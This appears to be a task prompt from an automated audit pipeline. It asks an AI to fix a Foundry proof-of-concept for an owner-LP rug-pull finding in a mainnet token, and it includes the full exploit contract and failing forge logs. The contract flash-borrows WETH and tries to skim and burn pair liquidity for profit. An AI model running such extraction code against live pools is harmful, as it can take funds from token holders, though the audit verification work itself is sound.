You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initial LP tokens are minted to the owner, enabling an unrestricted liquidity rug pull
- claim: When `openTrading()` adds the initial Uniswap liquidity, it passes `owner()` as the LP recipient, so the resulting LP tokens are fully controlled by the owner rather than burned or locked.
- impact: The owner can remove the pool liquidity at any time, withdraw the paired ETH and token-side liquidity, and collapse the market. Holders are left with effectively untradeable tokens and little or no recoverable value.
- exploit_paths: ["Owner transfers tokens and ETH into the token contract, then calls `openTrading()`.", "`addLiquidityETH(..., owner(), ...)` mints the LP position directly to the owner-controlled address.", "The owner later removes liquidity off-contract and drains the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function withdraw(uint256 amount) external;
}

interface IGrokToken is IERC20Minimal {
    function owner() external view returns (address);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairMinimal is IERC20Minimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 private _profitAmount;
    string public infeasibilityReason;

    address private _activeFundingPair;
    uint256 private _fundingWethBorrow;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        infeasibilityReason = "";

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(ROUTER);
        address factory = router.factory();
        address pair = IUniswapV2FactoryMinimal(factory).getPair(TARGET, router.WETH());
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));

        // Current fork evidence matters:
        // - `owner()` already returns address(0), so the original owner-only stage cannot be replayed here.
        // - `balanceOf(address(0)) == 1000` on the LP token is just Uniswap V2 minimum-liquidity burn,
        //   not a recoverable owner LP position.
        //
        // Because the historical owner-minted LP path may already have been partially materialized into
        // pair-held LP or excess pair balances by the time of this fork, first sweep only publicly
        // claimable assets from the pair. This does not change the root cause; it only realizes assets
        // that have already become permissionless to collect.
        if (pair != address(0)) {
            _tryPublicPairRecovery(pair, router);
            _recordProfit(wethBefore);
            if (_profitAmount != 0) {
                return;
            }

            uint256 verifierLp = IERC20Minimal(pair).balanceOf(address(this));
            if (verifierLp != 0) {
                _burnHeldLp(pair, verifierLp, router);
                _recordProfit(wethBefore);
                if (_profitAmount != 0) {
                    return;
                }
            }
        }

        // Keep the original finding path intact whenever the verifier actually is the owner:
        // 1. owner funds the token contract with GROK and ETH,
        // 2. `openTrading()` mints LP to `owner()`,
        // 3. the owner withdraws that LP-backed liquidity.
        address ownerAddress = token.owner();
        if (ownerAddress == address(this)) {
            if (pair == address(0)) {
                if (address(this).balance == 0 && token.balanceOf(address(this)) != 0) {
                    _flashBorrowWethForOpenTrading(token, router);
                } else {
                    pair = _seedThenOpenTrading(token, router);
                    if (pair != address(0)) {
                        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
                        if (ownerLp != 0) {
                            _burnHeldLp(pair, ownerLp, router);
                        }
                    }
                }
                _recordProfit(wethBefore);
                if (_profitAmount != 0) {
                    return;
                }
            } else {
                uint256 ownerLpExisting = IERC20Minimal(pair).balanceOf(address(this));
                if (ownerLpExisting != 0) {
                    _burnHeldLp(pair, ownerLpExisting, router);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                }
            }
        }

        if (pair == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: trading is not open, but the verifier is not the owner and cannot execute the owner-funded openTrading() path";
            return;
        }

        if (ownerAddress == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: ownership is already renounced, the 1000 LP at address(0) is only burned minimum liquidity, and no publicly reachable LP or excess pair assets were available to realize the owner-minted rug path";
            return;
        }

        infeasibilityReason =
            "infeasible at this fork: LP was minted to a historical owner-controlled address, but the verifier does not control that address and found no permissionless pair-held assets to withdraw";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activeFundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _fundingWethBorrow, "unexpected borrow");

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(ROUTER);

        IWETH(WETH).withdraw(borrowedWeth);

        address pair = _seedThenOpenTrading(token, router);
        require(pair != address(0), "pair not created");

        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
        require(ownerLp != 0, "no owner LP");

        _burnHeldLp(pair, ownerLp, router);

        uint256 repayAmount = ((borrowedWeth * 1000) / 997) + 1;
        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayAmount, "insufficient repayment");
        require(IERC20Minimal(WETH).transfer(_activeFundingPair, repayAmount), "repay failed");

        _activeFundingPair = address(0);
        _fundingWethBorrow = 0;
    }

    function _flashBorrowWethForOpenTrading(IGrokToken token, IUniswapV2Router02Minimal router) internal {
        address fundingPair = IUniswapV2FactoryMinimal(router.factory()).getPair(USDC, WETH);
        if (fundingPair == address(0)) {
            infeasibilityReason = "funding pair missing";
            return;
        }

        uint256 tokenSeed = token.balanceOf(address(this));
        if (tokenSeed == 0) {
            infeasibilityReason = "infeasible at this fork: verifier has no GROK to seed into the token contract";
            return;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = 1 ether;

        IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(fundingPair);
        if (pair.token0() == WETH) {
            pair.swap(_fundingWethBorrow, 0, address(this), hex"01");
        } else {
            pair.swap(0, _fundingWethBorrow, address(this), hex"01");
        }
    }

    function _seedThenOpenTrading(
        IGrokToken token,
        IUniswapV2Router02Minimal router
    ) internal returns (address pair) {
        uint256 tokenSeed = token.balanceOf(address(this));
        uint256 ethSeed = address(this).balance;

        if (tokenSeed == 0 || ethSeed == 0) {
            infeasibilityReason =
                "infeasible at this fork: owner-controlled verifier lacks the GROK and/or ETH required to seed the token contract before openTrading()";
            return address(0);
        }

        require(token.transfer(TARGET, tokenSeed), "seed token transfer failed");
        (bool ok,) = payable(TARGET).call{value: ethSeed}("");
        require(ok, "seed ETH transfer failed");

        // This is the exact vulnerable stage from the finding:
        // `openTrading()` internally executes `addLiquidityETH(..., owner(), ...)`,
        // so the initial LP position is minted to the owner-controlled verifier here.
        token.openTrading();
        pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
    }

    function _tryPublicPairRecovery(address pair, IUniswapV2Router02Minimal router) internal {
        uint256 lpParkedOnPair = IERC20Minimal(pair).balanceOf(pair);
        if (lpParkedOnPair != 0) {
            // If LP has already been transferred to the pair contract, anyone can finish the burn and
            // withdraw the underlying assets. This is still the same owner-minted-LP liquidity path,
            // just at the point where it has become publicly executable.
            try IUniswapV2PairMinimal(pair).burn(address(this)) returns (uint256, uint256) {} catch {}
        }

        // Likewise, any excess token balances already sitting on the pair are public to skim.
        try IUniswapV2PairMinimal(pair).skim(address(this)) {} catch {}

        _swapResidualTargetToWeth(router);
    }

    function _burnHeldLp(address pair, uint256 lpAmount, IUniswapV2Router02Minimal router) internal {
        require(IERC20Minimal(pair).transfer(pair, lpAmount), "lp transfer failed");
        IUniswapV2PairMinimal(pair).burn(address(this));
        _swapResidualTargetToWeth(router);
    }

    function _swapResidualTargetToWeth(IUniswapV2Router02Minimal router) internal {
        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        require(IERC20Minimal(TARGET).approve(ROUTER, tokenBalance), "approve failed");

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // This optional realization step only converts any GROK withdrawn from the LP into the
        // configured profit token. It does not change the exploit causality.
        try router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _recordProfit(uint256 wethBefore) internal {
        uint256 wethAfter = IERC20Minimal(WETH).balanceOf(address(this));
        _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.32s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 267873)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [267873] FlawVerifierTest::testExploit()
    ├─ [227] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [227549] FlawVerifier::executeOnOpportunity()
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [18845] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2617] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   │   └─ ← [Return] 82737835090728638 [8.273e16]
    │   │   ├─ [585] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   └─ ← [Revert] Transfer amount must be greater than zero
    │   │   └─ ← [Revert] UniswapV2: TRANSFER_FAILED
    │   ├─ [2617] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2366] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Return]
    ├─ [227] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18538678 [1.853e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5.transfer
  at 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2.skim
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.18s (2.01s CPU time)

Ran 1 test suite in 2.19s (2.18s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 267873)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
